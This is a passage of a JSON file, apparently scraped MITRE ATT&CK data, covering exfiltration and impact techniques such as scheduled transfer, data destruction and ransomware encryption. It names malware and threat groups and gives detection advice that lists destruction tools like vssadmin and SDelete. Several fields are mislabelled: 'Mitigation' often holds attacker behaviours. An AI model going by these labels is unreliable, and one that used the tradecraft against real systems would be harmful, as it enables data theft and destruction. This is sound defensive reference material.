        "detects": "Monitor executed commands and arguments that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for files being accessed by an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections to web and cloud services associated with abnormal or non-browser processes."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1567.001",
        "name": "Exfiltration to Code Repository"
      },
      {
        "id": "T1567.002",
        "name": "Exfiltration to Cloud Storage"
      },
      {
        "id": "T1567.003",
        "name": "Exfiltration to Text Storage Sites"
      },
      {
        "id": "T1567.004",
        "name": "Exfiltration Over Webhook"
      }
    ],
    "Tactic": "\nExfiltration"
  },
  {
    "Title": "Scheduled Transfer",
    "Code": "T1029",
    "Description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.[1]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can set itself to sleep before requesting a new command from C2.[2]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.[3]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).[4]"
      },
      {
        "id": "S0200",
        "name": "Dipsind",
        "description": "Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.[5]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has the ability to wait for a specified time interval between communicating with and executing commands from C2.[6]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.[7]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can be configured to reconnect at certain intervals.[8]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar can sleep for a specific time and be set to communicate at specific intervals.[9]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron can be configured to exfiltrate data during nighttime or working hours.[10]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.[11]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete sends stolen data to the C2 server every 10 minutes.[12]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can sleep for a given number of seconds.[13]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has sent data back to C2 every 8 hours.[14]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can pause C2 communications for a specified time.[15]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can sleep when instructed to do so by the C2.[16]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla contacts its C2 based on a scheduled timing set in its configuration.[17]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      }
    ],
    "Subtechniques": "\nExfiltration"
  },
  {
    "Title": "Transfer Data to Cloud Account",
    "Code": "T1537",
    "Description": "Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.[1]",
    "Mitigation": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": "Implement network-based filtering restrictions to prohibit data transfers to untrusted VPCs."
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": "Consider rotating access keys within a certain number of days to reduce the effectiveness of stolen credentials."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Limit user account and IAM policies to the least privileges required. Consider using temporary credentials for accounts that are only valid for a certain period of time to reduce the effectiveness of compromised accounts."
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Creation",
        "detects": "Monitor account activity for attempts to create and share data, such as snapshots or backups, with untrusted or unusual accounts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Cloud Storage Metadata",
        "detects": "Periodically baseline cloud storage infrastructure to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Cloud Storage Modification",
        "detects": "Monitor for anomalous file transfer activity between accounts and/or to untrusted/unexpected VPCs."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor network traffic content for evidence of data exfiltration, such as gratuitous or anomalous internal traffic containing collected data. Consider correlation with process monitoring and command lines associated with collection and exfiltration."
      },
      {
        "id": "DS0020",
        "dsource": "Snapshot",
        "dcomp": "Snapshot Creation",
        "detects": "Monitor account activity for attempts to create and share data, such as snapshots or backups, with untrusted or unusual accounts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Snapshot Metadata",
        "detects": "Periodically baseline snapshots to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Snapshot Modification",
        "detects": "Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs."
      }
    ],
    "Subtechniques": "\nExfiltration"
  },
  {
    "Title": "Account Access Removal",
    "Code": "T1531",
    "Description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.[1][2]In Windows, Net utility, Set-LocalUser and Set-ADAccountPassword PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the passwd utility may be used to change passwords. Accounts could also be disabled by Group Policy. Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.",
    "Mitigation": [
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access.[3]"
      },
      {
        "id": "S0372",
        "name": "LockerGoga",
        "description": "LockerGoga has been observed changing account passwords and logging off current users.[1][2]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex has changed user account passwords and logged users off the system.[4]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor has the ability to change the password of local users on compromised hosts and can log off users.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.)."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Deletion",
        "detects": "Monitor for unexpected deletions of user accounts. Windows event logs may designate activity associated with an adversary's attempt to remove an account (ex: Event ID 4726 - A user account was deleted).Alerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Modification",
        "detects": "Monitor for changes made to user accounts for unexpected modification of properties, such as passwords or status (enabled/disabled). Windows event logs may designate activity associated with an adversary's attempt to remove access to an account:Event ID 4723 - An attempt was made to change an account's passwordEvent ID 4724 - An attempt was made to reset an account's passwordEvent ID 4725 - A user account was disabledAlerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Data Destruction",
    "Code": "T1485",
    "Description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.[1][2][3][4][5][6] Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.[4][5] In some cases politically oriented image files have been used to overwrite data.[2][3][4]To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[1][2][3][4][6].In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.[7][8]",
    "Mitigation": [
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has used a custom secure delete function to make deleted files unrecoverable.[9]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.[10][11]"
      },
      {
        "id": "S0693",
        "name": "CaddyWiper",
        "description": "CaddyWiper can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.[12][13]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can delete specified files from a targeted system.[14]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles.[15]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can recursively wipe folders and files in Windows, Program Files, Program Files(x86), PerfLogs, Boot, System, Volume Information, and AppData folders using FSCTL_MOVE_FILE. HermeticWiper can also overwrite symbolic links and big files in My Documents and on the Desktop with random bytes.[16]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer’s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.[17]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar can overwrite files with random data before deleting them.[18]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk deletes system files to make the OS unbootable. KillDisk also targets and deletes files with 35 different file extensions.[19]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud.[20][21]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory.[22]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them.[23]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer overwrites files locally and on remote shares.[6][24]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has a command to write random data across a file and delete it.[25]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc can overwrite files indicated by the attacker before deleting them.[26]"
      },
      {
        "id": "S0364",
        "name": "RawDisk",
        "description": "RawDisk was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.[3][5]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil has the capability to destroy files and folders.[27][28][29][29][30][31][32]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used the BlackEnergy KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. [33][34]"
      },
      {
        "id": "S0195",
        "name": "SDelete",
        "description": "SDelete deletes data in a way that makes it unrecoverable.[35]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon attempts to overwrite operating system files and disk structures with image files.[1][2][3] In a later variant, randomly generated data was used for data overwrites.[5][36]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has a disk wiper module that targets files other than those in the Windows directory.[4]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can corrupt files by overwriting the first 1 MB with 0xcc and appending random extensions.[37][38][39][40][41][42]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash has destroyed Linux-based databases as part of its ransomware capabilities.[43]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Deletion",
        "detects": "Monitor for unexpected deletion of a cloud storage infrastructure, such as the DeleteDBCluster and DeleteGlobalCluster events in AWS, or a high quantity of data deletion events, such as DeleteBucket. Many of these events within a short period of time may indicate malicious activity."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for binaries that could be involved in data destruction activity, such as SDelete."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Deletion",
        "detects": "Monitor for unexpected deletion to a file (ex: Sysmon EID 23)"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to a large quantity of files for unexpected modifications in user directories and under C:\\Windows\\System32."
      },
      {
        "id": "DS0007",
        "dsource": "Image",
        "dcomp": "Image Deletion",
        "detects": "Monitor for unexpected deletion of a virtual machine image (ex: Azure Compute Service Images DELETE)"
      },
      {
        "id": "DS0030",
        "dsource": "Instance",
        "dcomp": "Instance Deletion",
        "detects": "Monitor for unexpected deletion of an instance (ex: instance.delete within GCP Audit Logs)"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes of binaries that could be involved in data destruction activity, such as SDelete."
      },
      {
        "id": "DS0020",
        "dsource": "Snapshot",
        "dcomp": "Snapshot Deletion",
        "detects": "Monitor for unexpected deletion of a snapshot (ex: AWS delete-snapshot)"
      },
      {
        "id": "DS0034",
        "dsource": "Volume",
        "dcomp": "Volume Deletion",
        "detects": "Monitor for unexpected deletion of a cloud volume (ex: AWS delete-volume)"
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Data Encrypted for Impact",
    "Code": "T1486",
    "Description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.[1][2][3][4]In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files.[5] In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.[3] To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[2][3] Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").[6]In cloud environments, storage objects within compromised accounts may also be encrypted.[7]",
    "Mitigation": [
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has used Hermes ransomware to encrypt files with AES256.[8]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.[9]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon encrypts the victim system using a combination of AES256 and RSA encryption schemes.[10]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has encrypted files and network resources using AES-256 and added an .avos, .avos2, or .AvosLinux extension to filenames.[11][12][13][14]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can use ChaCha8 and ECDH to encrypt data.[15][16][17][18]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit has encrypted files and disks using AES-128-CBC and RSA-2048.[19]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending .locked to the filename.[20]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.[21][22][23][24][25][26][27][28][29]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability to encrypt Windows devices, Linux devices, and VMWare instances.[30]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used Conti ransomware to encrypt a compromised network.[31]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network.[13][32]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files.[33][34][35]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can use CreateIoCompletionPort(), PostQueuedCompletionStatus(), and GetQueuedCompletionPort() to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. Conti can use \"Windows Restart Manager\" to ensure files are unlocked and open for encryption.[36][5][37][38][31]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba has the ability to encrypt system data and add the \".cuba\" extension to encrypted files.[39]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv has encrypted drives using the core encryption mechanism from DiskCryptor.[40]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM can use public and private key pair encryption to encrypt files for ransom payment.[41]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has encrypted files using an RSA key though the CryptEncrypt API and has appended filenames with \".lock64\". [42]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note.[6][43]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS uses standard encryption library functions to encrypt files.[44][45]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.[46][47]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks.[48]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS can use an embedded NTRU public key to encrypt data for ransom.[41][49][50]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom.[41]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has encrypted domain-controlled systems using BitPaymer.[20]"
      },
      {
        "id": "S0389",
        "name": "JCry",
        "description": "JCry has encrypted files and demanded Bitcoin to decrypt those files. [51]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.[52]"
      },
      {
        "id": "S0372",
        "name": "LockerGoga",
        "description": "LockerGoga has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.[53][54][55]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. [56][57]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. Maze has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.[58]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.[59][60]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can encrypt files on infected machines to extort victims.[61]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya encrypts user files and disk structures like the MBR with 2048-bit RSA.[62][3][63]"
      },
      {
        "id": "S0556",
        "name": "Pay2Key",
        "description": "Pay2Key can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.[64][65]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with .enc.[66]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.[67]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions.[68]"
      },
      {
        "id": "S0481",
        "name": "Ragnar Locker",
        "description": "Ragnar Locker encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.[69][70]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can encrypt files on victim systems and demands a ransom to decrypt the files.[71][72][73][74][75][76][77][78]"
      },
      {
        "id": "S0400",
        "name": "RobbinHood",
        "description": "RobbinHood will search for an RSA encryption key and then perform its encryption process on the system files.[79]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.[80][81][82]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.[83][38]"
      },
      {
        "id": "S0370",
        "name": "SamSam",
        "description": "SamSam encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.[84]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.[66]"
      },
      {
        "id": "S0639",
        "name": "Seth-Locker",
        "description": "Seth-Locker can encrypt files on a targeted system, appending them with the suffix .seth.[18]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon has an operational mode for encrypting data instead of overwriting it.[85][86]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck encrypts the victims machine followed by asking the victim to pay a ransom. [87]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.[88]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.[89]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.[90][2][91]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can encrypt data and leave a ransom note.[92][93][94]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.[95]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET performs AES-CBC encryption on files under ~/Documents, ~/Downloads, and~/Desktop with a fixed key and renames files to give them a .enc extension. Only files with sizes less than 500MB are encrypted.[96]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Modification",
        "detects": "Monitor for changes made in cloud environments for events that indicate storage objects have been anomalously modified."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files in user directories."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files in user directories."
      },
      {
        "id": "DS0033",
        "dsource": "Network Share",
        "dcomp": "Network Share Access",
        "detects": "Monitor for unexpected network shares being accessed on target systems or on large numbers of systems."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed  processes and/or command-lines involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Data Manipulation",
    "Code": "T1565",
    "Description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "Mitigation": [
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.[1]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files in order to manipulate external outcomes or hide activity"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Deletion",
        "detects": "Monitor for unexpected deletion of a file in order to manipulate external outcomes or hide activity"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc that would aid in the manipulation of data to hide activity"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for unexpected files with manipulated data in order to manipulate external outcomes or hide activity"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for networks that solicits and obtains the configuration information of the queried device."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls associated with altering data. Remote access tools with built-in features may interact directly with the Windows API to gather information."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1565.001",
        "name": "Stored Data Manipulation"
      },
      {
        "id": "T1565.002",
        "name": "Transmitted Data Manipulation"
      },
      {
        "id": "T1565.003",
        "name": "Runtime Data Manipulation"
      }
    ],
    "Tactic": "\nImpact"
  },
  {
    "Title": "Defacement",
    "Code": "T1491",
    "Description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.",
    "Mitigation": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.[1] Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may modify visual content available internally or externally to an enterprise network."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed visual content for internal or external enterprise networks."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files for unexpected modifications to internal and external websites for unplanned content changes."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
